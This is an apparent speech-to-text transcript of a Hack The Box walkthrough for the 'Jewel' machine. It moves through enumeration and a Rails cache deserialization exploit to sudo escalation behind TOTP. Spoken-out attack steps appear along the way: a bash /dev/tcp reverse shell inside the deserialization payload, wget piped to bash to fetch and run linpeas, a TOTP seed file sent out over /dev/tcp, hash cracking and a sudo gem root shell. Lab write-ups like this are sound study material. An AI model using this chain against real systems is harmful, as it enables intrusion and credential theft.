 what's going on youtube this is ipsec we're doing joel from half the box which was a super fun box that did something i didn't even know you could do in the private and that is put two-factor authentication around your pseudo command it was super cool to see and fun well maybe fun's the wrong word because it dealt with time zones and anything with time zones is just pain and in this one especially because if you had the time zone wrong just weird things would happen and you wouldn't realize it's related to the time zone at least if you're me but before you get to that privacy you have to do the initial put hold you see two web services on the box one hosting source code to a ruby on rails application and the second one is the ruby on rails application itself which is just a blog the blog isn't exactly vulnerable because of the web code it's vulnerable because of the rails framework being a out of date version so with all that being said let's just jump in and do this box as always we're going to start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the map directory and call it joule and then the ip address which is 10 10 10 to 11. this can take some time to run so i've already ran it but before we look at the results i do want to highlight the importance of that pseudo command because if you just did nmap101010.211 it's going to tell you the host is offline and that's because this box isn't listening on any of the default host discovery ports which is 80 and 443 and since it's not listing on those nmap thinks it's offline the third way it detects if a host is online or actually the very first way is sending a ping request or icmp but without root privileges nmap can't send that request so if i do a pseudo end map we'll see the results and if we want to look into the host discovery process we can do dash d for debug and dash dash packet trace and then the ip address which is 10 10 10 to 11. so we can see it initiates a ping request and then it sends um two port requests 80 and 443. one of these is sand and one's a syn ack but how it doesn't isn't too important just knowing it does a ping scan and adm 443 is good if you want a more in-depth thing i'm sure if you go to ipsec.rocks i've explained it in the past but since this box is listing on 22 800 and 8080 none of these host discovery ports are listening so the box thinks it's offline even if we specify the exact ports we want because host discovery fails it doesn't actually scan those ports so that's why the root privilege is important and that it needs root privilege because it interacts with raw sockets in order to do that ping and low privileged users can't do that if we look at the ping binary we'll probably see this is set uid so if we do um lsla it's not maybe it's a capability so git cap forget capability and we can see it has the capability net raw which allows it to interact with raw sockets and this is just a granular permission so you don't have to give it full root privilege to do something you can give it the permission it wants which is this um thing so nmap does not have that if we do git cap uh which and map that did not work where is nmap installed git cap user bin and map it has no capabilities and it's not a set uid so that's why it can't do that if you do it with sudo you can see it has these ports open so with all that being said let's dig into the nmap result and see it has three ports open the first one is ssh on port 22 and it's running debian the next one is http on port 8000 it's running apache and the title says get web which i guess is the application and the application being get makes me very interested uh then we also have a second http server on port 8080 running engine x and it's saying it's the fusion passenger so i want to know what this is because this is the only thing in this nmap scan i don't know so let's google fusion passenger and it's just a web app server that integrates with apache engine x and it supports um ruby python and node.js so it supports multiple languages and yeah it is version 606 we can do a search point on fusion see if there's anything uh 1.0 i don't even know if that's the same thing but let's see next thing we can do is maybe google this and look for release notes so release notes uh let's see maybe this if this has a date come on where's the date july 14 2020 um actually my birthday uh but because this box is retiring and boxes generally last like four to six months i'm gonna say this is a pretty recent version of passenger so i'm not going to go down the whole exploit path for this application instead let's just take a look at what was on port 8000 and 8080 so going to a new tab and then browsing to 10 10 10 to 11.8 000. i'm gonna copy this so we can go to 8080 really quick to see the difference between these two websites um this first one is has a dot get directory so i definitely want that and this one looks like a blog looking at this the title of this or the description of that get is blog so before looking at this application or poking at it manually um i'm assuming this is the source code to it so having the source code is always great so i'm going to try going to like dot get to see if we can go there doesn't look like we can so now the challenge is finding out how to download this if i click on snapshot it looks like we can download so it is now currently saving to my disk i'm going to make the directory blog and see if it's downloaded looks like it has so move downloads get to my directory and then tar zx vf to decompress it and it created this directory dot get so let's go into it and we see config.org so we know this is going to be a ruby application there is a gem file which goes into everything that is um required it's kind of like the requirements.text of python just telling you how to install this app one of the things i like doing with ruby applications is using a tool called breakman so if we search what breakman is it is a static security analyzer for um ruby so breakmanscanner.org so i always like using static code analyzers when i can because you may get a really quick win and there is a free version of this i forget how to get to install i think maybe under documentation's installation and before doing anything with jam or anything at all with ruby i'd highly recommend taking a snapshot of your vm just because sometimes metasploit doesn't like it when you muck with the ruby environment so let's now install this and it looks like we probably need route to do this so gem install break man and then it just says once we install it um going to running you just run breakman inside of your application so i'm going to run break man now that i have that gem installed and it's going to load the scanner and says there's only one finding which is a cross-site forgery i'm going to do break man dash h and see if there's a way we can be more of a boost i'm going to say dash capital a run all checks is a pretty cool option so we're going to do dash capital a and see what it says we have seven security warnings so missing encryption so force ssl is not enabled that's not something i really care about uh csrf token weak hash and unscoped find so if there is some type of user interaction maybe we can uh do some type of csrf but nothing here is sticking out as a big exploit and this is one of the tougher parts of this box is finding out the exploit because this application is not telling us there's a vulnerability and the vulnerability is pretty well hidden it is running rails version 5.2.2.1 and if we google like rails 5221 changelog and see if we can find a date i think if we go to rubygems versions i think this is one that will have a date we can see where things are released and remember that the fusion passenger that was like july 14 2020 and this is march 13 2019 so there's probably a reason in heck the box world why someone used a super out of date library like if this one was let's see this if we're running six zero three two or even five two four three because these are around the time the box released i probably wouldn't go down and look at all the exploit paths for this but because this version is particularly old i'm going to look into exploits for rails 5221 so let's just google rails cve and we'll look at the search results on mitre and denial of service i don't care csrf csrf i don't really care about those we do have a deceleration attack below 5243 her version was 5221 so these are going to be interesting we have two d sealizations and a code injection vulnerability so looking at these doesn't really give us too much detail allow attack and control the local again uh tackle to supply information can be inadvertently leaked from strong parameters nothing too interesting about these um the detailization vulnerability or it is interesting because it's deceleration but new details on how to exploit it um there's a typo in this vulnerability but um if we google this if we google for like poc or maybe do um search point for rails i don't see anything uh orbit file content that's five two one that could be vulnerable no five two two one is what we have so nothing too interesting there but if i google this cve uh we go to github and we can find a poc or a proof of concept so i don't know exactly what this is but at the bottom there is a google form link so we go here and it's saying let's see a potentially unintended unmarshalling of user-provided imports and memcached one redis cash door let's see there's something that says if they use raw true so let's look at our code so i'm just gonna do grep dash r raw colon true i'm gonna do i to make it case insensitive and then period and we can see there are two items that is using cache.fetch which it's saying to do here and raw true so before we dig into this i'm kind of curious what this raw true is so i'm gonna google uh cache.fetch and rails to see if we can find some documentation of what this is so i'm going to search for raw and you can specify raw to send a value directly to the server with no serialization and it's talking about redis which is a like caching thing i'm sure we've done a box in the past where we exploited redis because the exploit here is saying if we use raw we can send it to the server and the application itself won't serialize it we're just sending it a raw string so i'm assuming we send it a raw string that's a serialized object and then when later the application gets that raw string it does some type confusion goes oh this is a serialized object let me un-serialize it not realizing this was a serialized object that the user wrote and when a user writes a serialized object and gets a server to unserialize it bad things can happen so that is the exploit path in this box it seems so the step is to find out where this raw true is so let's look in this controllers.rb file and i'm going to use vim actually so we have syntax highlighting raw true so this is under current username and let's go to the next file this user's controller raw true whoops i need a space there we go and this is under update so it looks like we can update our user and send a value directly into the cache database as a string which we can put as a serialized object i bet if we look at this create option the create doesn't have raw true so this exploit is only possible when we're updating a username so knowing all this let us go back to the cve page and look at how we do this so this is creating the serialized object we're doing bundle exec rails console and that's putting us in this interactive ruby prompt and we create the cached object to put in and then print to the screen as a url encoded payload and that's going to be this so we have to go to the blog app and create a user so i'm going to do sign up username is going to be ipsec root ipsec.rocks and password of password so we create the user let's now log in so root ipsec dot rocks password of password and then we can go to our profile and we can edit our name so this is where we have to put the serialized object so let's go see how we create this we need bundle exec rails console so let's get out of this and i'm going to go up to this bundle exec rails console and this isn't working so we need to create a rails project for this and if i do rails i'd actually don't have it installed so we have to do apt update to update apt or a pseudo apt update and then once it updates we can do a sudo apt install rails and there were some error messages but it looks like it may be fine let's see there's a lot of gets it's doing so let's wait for this to complete and my apt command is not happy with me so if i do this apt update again i can see we have this following syndra cannot be verified because public key is not available um if i do a apt key list to list all my keys i'm actually going to pipe this over to less i'm going to search for expired and i can see this key is expired so what i'm going to do is this apt update command again and we will do a sudo apt key advanced key server keys.gnupg.net and then we need to receive the keys for this and this should tell us it is updated a key or maybe imported key i don't know exactly the message but after this runs we will see there we go imported one key so now my apt update command does complete successfully so i can now do a apt install rails and i have to again emphasize how important this is to install uh to put a snapshot in before doing a command like this because bad things can happen happen when you install rails with metasploit and other ruby projects this is going to take a while so i'm going to just use the magic of video editing and skip to when this command finishes so our apt install rails command has finished so we can create a new rails project with rails new and then the project name so we'll just do exploit and then when we go into exploit we can just do rails console so cd exploit or i think we could do this bundle exec command where is it bundle exact rails console see if it works if it doesn't then we can just do yeah so this works or we can just do rails console you don't need to do that bundle thing same exact thing and we can go back to the payload and edit this so the only thing we actually have to edit is this code piece i wonder if there's a paste a place where i can just copy the whole payload instead of going line by line uh does that google form have it nope so i think i have to copy that line by line which is going to be annoying but let's just go to here so code and then we put in single brackets and uh these tilde or whatever that's called the code execution brackets and we have to put a payload so instead of a touch i'm going to do bin bash dash c then bash dash i type to that dev tcp 10 10 14 4 port 9001 0 at and one and double quote and the reason why i always do this bash dash c first is because this is a like bash ism if i'm not in a bash shell this redirection thing won't work so this ensures i'm executing in bash so when i do this redirection this works so you may not need this but if you don't have this it may fail silently and you won't know and i've never seen putting this actually break the payload so one of the things i always do out of habit so we have that so let's now copy each piece so that i forgot the e so type that uh okay it was in red font so i was like wait error message but no it's just tell me what that variable was so do that and then we can whoops copy that okay and then we need puts payload require uri so this payload um i think that just made our serialized object maybe this required is like an import statement loading uri and now we can do wait i don't know what that puts payload did honestly um actually i think all that does and ruby puts is print so it just printed payload so then when we do this uh no we screwed something up let's see this is the rails app puts undefined local payload so it aired with this i think so let's look at this command again and the other error we got was like payload not found i think whereas it puts uri undefined local variable payload i'm assuming this needs an equals uh we do payload now there we go that looks better um when i tried printing it out before i just zoomed it couldn't print the serialized object so now that we have that we can copy this command uh no we need this wrong piece of clipboard there we go so now we have a serialized object so this is just this but in url encoding uh we could probably copy this and just have burp suite do url encoding for us we don't actually need ruby to do this piece but oh well i'm going to copy this make sure i don't get that one line break so now we can finally go back to our blog and our edit field i'm going to refresh this page in case there's anything time sensitive and let's just go to prep suite go to a proxy tab intercept is on update user and i'm going to change where the username is i'm going to paste this giant payload which is that serialized object click forward and i must be logged in to perform this action so something was time sensitive and it logged me out so let's go root at ipsec dot rocks password of password and go back to profile intercept on update user change forward turn intercept off something went wrong if we nc lvnp 9001 refresh the page see profile updated successfully when we view our profile page uh nothing happened i'm going to try this again so let's copy this profile username let's make sure we're editing this update user paste our payload there we go i'm going to make sure it's not putting a line break at the beginning so i'm going to do backspace and it deleted that equals so let's go back and do that forward something went wrong i'm just going to hit enter and we got shell so what actually happened here um let's see can i easily show this yeah we should show this this video hasn't taken too long so this is potentially a common mistake since i just made it unintentionally and took me a second to realize what happened let me log out and we'll create a new account uh please subscribe password is please at ipsec dot rocks or let's do check out ipsec dot rocks password and password so log in check out ipsec.rocks password oh come on okay i was like did i type it on that one field so i'm going to create a new session ncl vmp 9001 we're going to make sure we have this in our clipboard and turn burp suite on make sure intercept is on and i'm going to put my username as the payload when i click forward we had something went wrong here so what i had done is i hit ctrl shift r to refresh the page because that's my habit when i refresh pages but that's going to send the payload my browser thinks i sent uh because burp suite intercepted the payload my browser still thinks it sent the payload of ipsec so i'm going to hit ctrl shift r and this screen pops up my send information will repeat any action i'm going to click see intercept is still on i'm going to click resend let's see this is not the detect portal but it reset this and sent the username and it reset the user eliminating that field so that is why when i went here it still said my user was please subscribe and the payload did not fire but if we go back let's not intercept this one let's intercept this request click forward so we now have poisoned the reddest cache and upon viewing this page that's where that second uh thing gets triggered so i'm not gonna do control shifter i'm just going to do enter and that's where we see we now have that shell so that is the exploit and if you're having trouble make sure you don't accidentally reset the user back to the previous thing not the payload by doing ctrl shift r but now that we have this i'm going to do python uh let's do which python to make sure we have python we do so python dash c import pty pty dot spawn bin dash and i'm going to make dirt dub dub dub i'm going to copy uh opt privilege escalation script awesome sweet lin pease and then lin ps.sh to this directory and i'm going to run python3 dash m http server do we have curl we do so i'm going to do curl 10 10 14 4 port 8000 lynn p's sh type it over to bash to execute it i don't have curl um didn't give me an error message so i thought i did let's just do cd dev shm wget on this page i know there's a way to do wget to standard out let me just google this w get to std out because in all the videos i default when carol's not there to writing it to disk um i think it's like wget dash o standard out i think it's dash o dash yeah dash o uh capital o dash uh i have to do control z st2y raw minus echo hit f g enter enter now i have my up key so i'm going to w get dash o dash i'm also going to add dash q i think which i think is quiet and then we pipe this over to bash and now we have wget running the script without doing any disk writing so let's this script run and after it finishes we'll come back and see if we can find anything now that linps is done and the very last thing it did was search for specific hashes inside of files and it decided to look in these files on its own and gave me two password hashes which i love so let's take a look at exactly what these hashes are so i'm going to do less on this sql file and i'm just going to search it for 2a so slash 2a and we see actually two hashes um let's see s z and q q so going back up it looks like the q q one isn't shown so we should look at both these hashes for stuff i'm just going to put this in a new pane uh we don't need the web server anymore put that there so let's grab 2a on verb backups dump and we have a password for jennifer and bill here oddly enough i don't know why i didn't grab both of these and it only grabbed one that's weird but let's run that command again awk print let's see one two so we want two colon three four five six uh dollar six see it did a date eight there we go so we got two hashes here and a better format and let's do the same thing but a home bill blog bd.sql so home bill blog bd.sql see let me clear the screen a little bit looks like we have two hashes and these are different hashes so let's copy these okay i'm going to copy these now to my kraken server and let's try cracking it so ssh to the kraken cd hashcat v hashes jewel paste these and i believe this is bcrypt i'm going to do dot slash hash cat dash dash example hashes and search for bcrypt uh 2a 0 5 or 2 star is what it says so i'm assuming this b crypt which is mode 3200 so dot slash cat dash m 3200 hashes joule opt word list rocky.text and i think that's all i need oh i'm going to need to add that dash dash username flag dash username i think it's username maybe usernames i never remember if it's plural or not but uh one token length exception for bill and i think that is my fault so before we begin i'm going to fix the hashes so line two had a error um it was up here line two was in the backups directory or xw so i accidentally deleted a character i thought i added a character before but i accidentally deleted it there we go so now let's rerun hash cat and make sure we don't get any line length exceptions so far it is looking good three four there we go we can look at how long this is going to take says 22 hours but it already got one which is spongebob so i'm going to quit this and we can just do show i think we need username again and we can see bill had a password of spongebob so i'm going to just run this so we have it running in the background and oh we are the bill user so if we do sudo l password of spongebob we get this verification code after we type that so i'm going to google sudo verification code and we see it's some type of two factor login for pseudo so that is unique if we go into our home directory there is a google authenticator file and i'm actually going to search my history recursively and files inside so lynn p's did show us this google authenticator thing so if we cap this it looks like we potentially have a seed and i honestly don't know if this is required to work generally when you do two-factor authentication you wouldn't have this here but because this google authenticator file does exist i'm going to assume we can exploit this so let's copy this to our box so i'm going to do netcat lvnp 9001 direct it to the file google auth and we can cat google authenticator to dev tcp 1010 14 4 port 9001 and we sent the file i'm going to md5 summit on both ends just to make sure it works so md5 sum google auth and that is the same i'm going to send my hash cat to a different pane i thought um three there we go so now my hash cat is away so that's not painting the screen uh i'm gonna do app search oauth and see what we have um oauth there is a lot of ruby nerd oauth let's see sudo apt install oauth is there a binary that just has oauth no we're not that lucky so let's see maybe if we try googling linux off cli for command line application uh we see maybe add google for google oauth we have oauth is a simple cli for the google api we go here looks like there are some binaries so i'm going to try to install this so save file let's make the oauth go into it and then move is it just linux or something downloads linux amd i think that's it tara zxvf oauth2l mod plus x let's move that to a directory a curl fetch header what is this fetch so you could not get default credentials that doesn't look like what we want does this give examples how to use it get clone fetch credentials cloud platform see test token i don't think this is it um linux oauth tool maybe this uh oauth tool in apt sudo apt install oauth tool it's weird so how do we get owath tool oauth toolkit downloads page debian iowa tool command line so download amd64 let's see if this oh i did open my bad save file sudo d package i downloads this see there's a dependency let's see sudo apt install lib oauth zero let's see let's try this uh man this is not a fun challenge to do live it's not understood what oh forgotten now okay following new packages will be installed oauth tool see i have to install this waiting for headers let's restart there we go so now let's run this d package command to install it i'm not seeing any dependency issue which is promising uh wait earth tool was that my issue at search earth tool yes um i was typing oauth thinking that was the package name but it's just oath so you might just do sudo apt install oath tool you have to go through that whole d package thing um i'm guessing i installed a later version because it's saying downgraded but now we have earth tool it says to use dash to read from standard input or at file to read from a file name so i'm going to do at or let's move um google auth to this directory and we can do oauth tool at google auth to see what happens hex decoding of secret failed i'm going to try dash b and we get a key this dash b is base 32 encoding of key instead of hacks and if we look at this i believe this is the key and this is definitely not hex the default for base 32 is off so yeah base 32 is essentially base 64 but um not case sensitive i believe so we do that and we get a key so let's try using this key with ssh so let's do sudo-l password was spongebob and we're going to run this 05979 and we get an error message on this again and uh it's not working so maybe we did this wrong i'm going to touch test and we're just going to run dashb test uh error reading key let's see let's go back to dash h see if there's any other options um maybe we can try totp so dashb was it google auth and then totp nothing is it dash dash so we can try running it with this c l paste and still not working so the next thing i'm going to try well at least now it changed so before without that totp it's always the same so at least now it's changing maybe it changed before we had a chance to type it in four eight four two six i'm gonna run date on both ends to make sure our date is the same uh this is gmt i am est so we have the dreaded time time zone conversion but date dash s let's do 21 or not 21 19. i'm gonna assume my hour's correct and maybe minutes not so run date again 16 i'm gonna say a 20 let's say 30. pseudo 26 this should be fine now so now our date hopefully is correct as long as the hour is correct so now i'm going to run this off tool again 747238 and i probably type of that copy paste and we are still having issues oh wait spongebob verification code now uh spongebob and then put this error not permitted while writing config spongebob let's try this again copy paste i don't know why it's giving me that error i can't tell if that's an actual error of the application or a different error um sh bill at 10 10 10 to 11. yes okay so we can only off with um ssh keys it looks like so i'm going to make the home ssh and let's do sh keygen dash f bill cat idrsa or cat build.pub and let's try adding this file here so echo this to authorized keys chmod 600 authorized keys and we created that in the oauth directory chmod 600 bill sh-i bill bill at 10 10 10 to 11. so now we're logged in with the proper terminal so just in case there was like something breaking because of my reverse shell with this that's why i did this so now i have a legitimate session so we can copy this paste and we still get this operation on not permitted while writing config so i'm going to try this google auth and let us copy this i'm going to do oauth tool and we'll do it this way earth tool maybe i don't need the dash for standard n okay stash is for a standard end so i'd be typing that but it looks like i can do it this way so i'm going to copy this i just want to see if this is giving me different values so we got this so this is identical so spongebob i'm thinking something maybe broke with this box because i think sudo was updated for the pseudo exploit and that may have broke this box um i'm gonna pause the video and check a few things so i don't think the update broke it what i actually think happened is my time is off so i did date on both ends and i looked i'm like converting this to my head like oh this is like 9 41 gmt i'm 9 41 am like it's a time zone conversion thing um the hours is correct if um this said pm so let's do date dash s i wonder if i can just do pm nope so 9 42 30 pm okay sudo and i probably should change the date a bit more but maybe i'll be within sync enough so let's try because i changed the time i think my ssh is going to die for a little bit this will work though sudo l spongebob verification code let's do uh copy and paste so copy paste operation not permitted spongebob i'm going to write uh one what spongebob one two three four five six and i don't get that operation failed that is such a weird behavior date date 943 it's close time date ctl time date ctl let's see time zone i just do europe london uh see how do i set time zone tz config that's not it let's try sudo time date ctl set time zone europe london date awesome eight okay so pseudo date dash s i'm going to copy this and we're going to say 21 45 10. we go so now our date should be in sync again because i changed the date my ssh prompt is hung for a little bit i think it has to do is like some type of key or renegotiation or something but seems fixed date seems accurate pseudo dash l spongebob let's do this owl thing or earth it's not oauth at all i don't know why i keep saying oauth but earth tool paste uh spun well it didn't work but that's more promising so we get did not get that error message see okay it's valid my clipboard so something is wrong still um this required a library i suppose we can't just upload this tool here which earth tool we can try uh cd let's nc lvnp 10 9001 user bin earth tool dev shm nc 1010 14 4 9001 earth tool chmod plus x let's see locate lib host dot so locate lib oath oh i gotta update db let this run and then we can locate it copy this nclvnp 9001 send this file so this is web oath.so.zero let's see file lib earth so zero that did not work i was hoping it would load from the current like this directory one if we can export path is equal to dot colon path will that work no date on both ends 9 48 20 this is correct i'm just going to try ssh'ing again let's try this pseudo-l spongebob verification code three one two two six three somehow i think we went backwards in progress oh my date now says i'm a whole day ahead that's annoying date dash s uh let's do 2 10 20 21 21 49 uh we'll say 15. there we go now my date is correct so pseudodeshell spongebob 691731 there we go so it was a time zone issue i don't know why like before it was giving that weird error message that is super weird behavior but now we can do user bin gem so let's do gtfo bin maybe if it detects like a previously valid uh totp then it does that i don't know but it looks like we have a few ways we can do this so pseudo gem like this so let's try this ben sh sure and we get root um because we ran sudo before i think that's why it didn't prompt us so we can exit this again run this pseudo gem open and once the password says spongebob and it wants a totp code so let's copy and paste this and yep that works so that is the box hope you guys enjoyed it take care and i will see you all next week oh wait before we go i did just want to show if we do github breakman i did put a um issue in for it not checking that cve so we'll see if it gets added but yep that's it take care and i will see you all next week